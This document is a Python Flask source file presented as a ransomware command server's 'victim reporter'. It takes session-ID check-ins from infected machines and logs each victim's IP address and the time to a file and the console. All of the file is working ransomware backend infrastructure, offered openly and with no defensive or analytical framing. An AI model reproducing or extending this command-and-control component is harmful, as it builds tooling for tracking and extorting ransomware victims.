from flask import Flask, jsonify, request
import logging
import csv
from datetime import datetime

app = Flask(__name__)

# Setup error + event logging only to file
file_handler = logging.FileHandler("victim_reports.log")
file_handler.setLevel(logging.INFO)
file_formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
file_handler.setFormatter(file_formatter)

# Setup concise terminal logging for CMD
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.WARNING)  # only warnings/errors go to CMD
console_formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
console_handler.setFormatter(console_formatter)

# Apply handlers
app.logger.setLevel(logging.INFO)
app.logger.addHandler(file_handler)
app.logger.addHandler(console_handler)

@app.route("/report", methods=["POST"])
def report():
    data = request.get_json()
    session_id = data.get("session_id")
    victim_ip = request.remote_addr
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if not session_id:
        error_msg = f"[{timestamp}] ERROR: No session ID provided from {victim_ip}"
        app.logger.error(error_msg)
        return jsonify({"error": "No session ID provided"}), 400

  
    # Log to log file only (not info-spam)
    app.logger.info(f"New victim reported. Session ID: {session_id}, IP: {victim_ip}")
    print(f"[+] New victim reported: {session_id} from {victim_ip}")

    return jsonify({"status": "received", "session_id": session_id}), 200

@app.route("/")
def home():
    return "\U0001F6E1️ Ransomware Command Server (Victim Reporter) is Running \U0001F6E1️"

if __name__ == "__main__":
    print("\n[+] Victim Reporter Server Listening on Port 5001...\n")
    app.run(host="0.0.0.0", port=5001)
